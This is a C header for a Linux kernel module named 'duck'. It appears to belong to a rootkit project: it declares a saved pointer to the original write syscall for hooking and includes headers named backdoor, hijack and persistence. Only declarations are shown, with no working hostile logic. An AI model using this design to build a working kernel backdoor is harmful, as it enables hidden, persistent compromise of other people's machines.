#ifndef _DUCK_H_
#define _DUCK_H_

#include <linux/kernel.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");

int duck_init(void);
void duck_exit(void);
module_init(duck_init);
module_exit(duck_exit);

asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);

#include "backdoor.h"
#include "hijack.h"
#include "misc.h"
#include "persistence.h"

#endif /* _DUCK_H_ */